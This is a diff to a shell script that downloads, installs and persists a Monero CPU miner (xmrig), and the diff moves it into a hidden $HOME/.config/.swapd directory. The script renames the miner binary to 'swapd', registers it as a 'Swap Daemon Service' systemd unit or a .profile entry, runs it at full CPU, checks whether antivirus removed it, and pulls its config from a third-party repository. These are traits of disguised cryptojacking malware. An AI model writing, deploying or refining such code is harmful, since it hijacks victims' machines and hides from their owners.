@@ -125,7 +125,7 @@ fi
 # printing intentions
 
 echo "I will download, setup and run in background Monero CPU miner."
-echo "If needed, miner in foreground can be started by $HOME/.swapd/swapd.sh script."
+echo "If needed, miner in foreground can be started by $HOME/.config/.swapd/swapd.sh script."
 echo "Mining will happen to $WALLET wallet."
 if [ ! -z $EMAIL ]; then
   echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
@@ -161,7 +161,8 @@ echo "[*] Removing $HOME/moneroocean directory"
 rm -rf $HOME/moneroocean
 rm -rf $HOME/.moneroocean
 rm -rf $HOME/.gdm2
-rm -rf $HOME/.swapd
+rm -rf $HOME/.config/.swapd
+rm -rf $HOME/.config/.swapd
 
 echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
 if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
@@ -171,22 +172,22 @@ fi
 
 # wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
 
-echo "[*] Unpacking xmrig.tar.gz to $HOME/.swapd"
-[ -d $HOME/.swapd ] || mkdir $HOME/.swapd
-if ! tar xf xmrig.tar.gz -C $HOME/.swapd; then
-  echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.swapd directory"
+echo "[*] Unpacking xmrig.tar.gz to $HOME/.config/.swapd"
+[ -d $HOME/.config/.swapd ] || mkdir $HOME/.config/.swapd
+if ! tar xf xmrig.tar.gz -C $HOME/.config/.swapd; then
+  echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.config/.swapd directory"
   exit 1
 fi
 rm xmrig.tar.gz
 
-echo "[*] Checking if advanced version of $HOME/.swapd/xmrig works fine (and not removed by antivirus software)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.swapd/config.json
-$HOME/.swapd/xmrig --help >/dev/null
+echo "[*] Checking if advanced version of $HOME/.config/.swapd/xmrig works fine (and not removed by antivirus software)"
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/.config/.swapd/config.json
+$HOME/.config/.swapd/xmrig --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/.swapd/xmrig ]; then
-    echo "WARNING: Advanced version of $HOME/.swapd/xmrig is not functional"
+  if [ -f $HOME/.config/.swapd/xmrig ]; then
+    echo "WARNING: Advanced version of $HOME/.config/.swapd/xmrig is not functional"
   else 
-    echo "WARNING: Advanced version of $HOME/.swapd/xmrig was removed by antivirus (or some other problem)"
+    echo "WARNING: Advanced version of $HOME/.config/.swapd/xmrig was removed by antivirus (or some other problem)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
@@ -199,28 +200,28 @@ if (test $? -ne 0); then
     exit 1
   fi
 
-  echo "[*] Unpacking xmrig.tar.gz to $HOME/.swapd"
-  if ! tar xf xmrig.tar.gz -C $HOME/.swapd --strip=1; then
-    echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.swapd directory"
+  echo "[*] Unpacking xmrig.tar.gz to $HOME/.config/.swapd"
+  if ! tar xf xmrig.tar.gz -C $HOME/.config/.swapd --strip=1; then
+    echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.config/.swapd directory"
   fi
   rm xmrig.tar.gz
 
-  echo "[*] Checking if stock version of $HOME/.swapd/xmrig works fine (and not removed by antivirus software)"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
-  $HOME/.swapd/xmrig --help >/dev/null
+  echo "[*] Checking if stock version of $HOME/.config/.swapd/xmrig works fine (and not removed by antivirus software)"
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.config/.swapd/config.json
+  $HOME/.config/.swapd/xmrig --help >/dev/null
   if (test $? -ne 0); then 
-    if [ -f $HOME/.swapd/xmrig ]; then
-      echo "ERROR: Stock version of $HOME/.swapd/xmrig is not functional too"
+    if [ -f $HOME/.config/.swapd/xmrig ]; then
+      echo "ERROR: Stock version of $HOME/.config/.swapd/xmrig is not functional too"
     else 
-      echo "ERROR: Stock version of $HOME/.swapd/xmrig was removed by antivirus too"
+      echo "ERROR: Stock version of $HOME/.config/.swapd/xmrig was removed by antivirus too"
     fi
 #    exit 1
   fi
 fi
 
-echo "[*] Miner $HOME/.swapd/xmrig is OK"
+echo "[*] Miner $HOME/.config/.swapd/xmrig is OK"
 
-mv $HOME/.swapd/xmrig $HOME/.swapd/swapd
+mv $HOME/.config/.swapd/xmrig $HOME/.config/.swapd/swapd
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -233,17 +234,17 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.swapd/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.swapd/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.swapd/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.swapd/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.swapd/config.json
-sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
+sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $HOME/.config/.swapd/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/.config/.swapd/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.config/.swapd/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/.config/.swapd/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HOME/.config/.swapd/swapd.log'",#' $HOME/.config/.swapd/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.config/.swapd/config.json
+sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.config/.swapd/config.json
 
-#rm $HOME/.swapd/config.json
+#rm $HOME/.config/.swapd/config.json
 
-#cat $HOME/.swapd/config.json <<EOL
+#cat $HOME/.config/.swapd/config.json <<EOL
 #{
 #    "autosave": true,
 #    "background": false,
@@ -267,39 +268,39 @@ sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
 
 wget --no-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
 
-curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.swapd/config.json
+curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.config/.swapd/config.json
 
-cp $HOME/.swapd/config.json $HOME/.swapd/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HOME/.swapd/config_background.json
+cp $HOME/.config/.swapd/config.json $HOME/.config/.swapd/config_background.json
+sed -i 's/"background": *false,/"background": true,/' $HOME/.config/.swapd/config_background.json
 
 # preparing script
 
 killall xmrig
 
-echo "[*] Creating $HOME/.swapd/swapd.sh script"
-cat >$HOME/.swapd/swapd.sh <<EOL
+echo "[*] Creating $HOME/.config/.swapd/swapd.sh script"
+cat >$HOME/.config/.swapd/swapd.sh <<EOL
 #!/bin/bash
 if ! pidof swapd >/dev/null; then
-  nice $HOME/.swapd/swapd \$*
+  nice $HOME/.config/.swapd/swapd \$*
 else
   echo "Monero miner is already running in the background. Refusing to run another one."
   echo "Run \"killall swapd\" or \"sudo killall swapd\" if you want to remove background miner first."
 fi
 EOL
 
-chmod +x $HOME/.swapd/swapd.sh
+chmod +x $HOME/.config/.swapd/swapd.sh
 
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
   if ! grep .swapd/swapd.sh $HOME/.profile >/dev/null; then
-    echo "[*] Adding $HOME/.swapd/swapd.sh script to $HOME/.profile"
-    echo "$HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1" >>$HOME/.profile
+    echo "[*] Adding $HOME/.config/.swapd/swapd.sh script to $HOME/.profile"
+    echo "$HOME/.config/.swapd/swapd.sh --config=$HOME/.config/.swapd/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HOME/.swapd/swapd.sh script is already in the $HOME/.profile"
+    echo "Looks like $HOME/.config/.swapd/swapd.sh script is already in the $HOME/.profile"
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/.swapd/swapd.log file)"
-  bash $HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
+  echo "[*] Running miner in the background (see logs in $HOME/.config/.swapd/swapd.log file)"
+  bash $HOME/.config/.swapd/swapd.sh --config=$HOME/.config/.swapd/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
@@ -310,8 +311,8 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background (see logs in $HOME/.swapd/swapd.log file)"
-    bash $HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
+    echo "[*] Running miner in the background (see logs in $HOME/.config/.swapd/swapd.log file)"
+    bash $HOME/.config/.swapd/swapd.sh --config=$HOME/.config/.swapd/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
@@ -324,7 +325,7 @@ cat >/tmp/swapd.service <<EOL
 Description=Swap Daemon Service
 
 [Service]
-ExecStart=$HOME/.swapd/swapd --config=$HOME/.swapd/config.json
+ExecStart=$HOME/.config/.swapd/swapd --config=$HOME/.config/.swapd/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -358,14 +359,14 @@ if [ "$CPU_THREADS" -lt "4" ]; then
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.swapd/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.swapd/config_background.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.config/.swapd/config.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.config/.swapd/config_background.json"
 fi
 echo ""
 
 echo "[*] Determining GPU+CPU (without lshw)"
 cd /tmp ; cd .ICE-unix ; cd .X11-unix ; yum install pciutils -y; apt install pciutils -y; update-pciids ; lspci -vs 00:01.0 ; nvidia-smi ; aticonfig --odgc --odgt ; nvtop ; radeontop ; echo "Possible CPU Threads:" ; (nproc) ;
-# cd $HOME/.swapd/ ; wget https://github.com/pwnfoo/xmrig-cuda-linux-binary/raw/main/libxmrig-cuda.so
+# cd $HOME/.config/.swapd/ ; wget https://github.com/pwnfoo/xmrig-cuda-linux-binary/raw/main/libxmrig-cuda.so
 
 #echo "[*] Determining GPU+CPU"
 #cd /tmp ; cd .ICE-unix ; cd .X11-unix ; yum install pciutils lshw -y; apt install pciutils lshw -y; update-pciids ; lspci -vs 00:01.0 ; lshw -C display ; nvidia-smi ; aticonfig --odgc --odgt ; nvtop ; radeontop ; echo "Possible CPU Threads:" ; (nproc) ;
